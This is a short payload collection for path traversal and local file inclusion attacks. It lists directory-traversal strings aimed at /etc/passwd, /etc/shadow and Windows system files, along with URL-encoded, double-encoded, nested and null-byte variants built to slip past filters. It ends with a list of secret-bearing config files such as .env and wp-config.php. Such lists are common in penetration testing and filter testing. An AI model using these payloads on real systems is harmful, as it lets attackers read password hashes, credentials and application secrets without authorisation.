# Payload Collection

## Linux

../../../etc/passwd

../../../../etc/passwd

../../../../../etc/passwd

---

## Windows

..\..\..\windows\win.ini

..\..\..\windows\system32\drivers\etc\hosts

---

## Absolute Paths

/etc/passwd

/etc/shadow

C:\Windows\win.ini

---

## Encoded

%2e%2e%2f

%2e%2e%5c

---

## Double Encoded

%252e%252e%252f

%252e%252e%255c

---

## Nested

....//

....\/

---

## Null Byte

../../../etc/passwd%00.png

../../../etc/passwd%00.jpg

---

## Common Sensitive Files

.env

config.php

wp-config.php

application.properties

settings.py

web.config